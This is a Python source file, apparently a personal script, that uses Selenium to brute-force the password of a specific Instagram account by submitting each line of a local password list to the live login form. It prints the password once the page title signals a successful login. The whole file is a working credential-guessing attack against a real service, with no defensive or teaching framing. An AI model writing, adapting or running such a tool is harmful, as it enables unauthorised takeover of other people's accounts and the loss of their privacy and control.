from colorama import Fore
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


class pwdCracking:
    def __init__(self, username, pswFilePath):
        self.username = username
        self.pswFile = open(pswFilePath, "r")
        self.base_url = 'https://www.instagram.com'
        self.driver = webdriver.Chrome('./chromedriver.exe')  # ,options=options

    def crackPass(self):
        self.driver.get('{}/accounts/login/'.format(self.base_url))
        time.sleep(2)
        self.driver.find_element_by_xpath("//button[contains(text(),'Accept')]").click()
        self.driver.find_element_by_name('username').send_keys(self.username)
        for line in self.pswFile:
            line = line.strip('\n')
            WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.NAME, 'password'))).click()
            self.driver.execute_script('arguments[0].value = "";', self.driver.find_element_by_name('password'))
            WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.NAME, 'password'))).send_keys(line)
            self.driver.execute_script("arguments[0].click();",
                                       self.driver.find_element_by_xpath('//*[@id="loginForm"]/div'
                                                                         '/div[3]/button'))
            time.sleep(7)
            # if Password was found Let's print it
            if self.driver.title == "Instagram":
                print(Fore.GREEN + "[!] Logged in as {0} with password {1}".format(self.username, line))


if __name__ == '__main__':
    bot = pwdCracking('matangalilove', r"D:\Python\InstagramBot\passwords.txt")
    bot.crackPass()
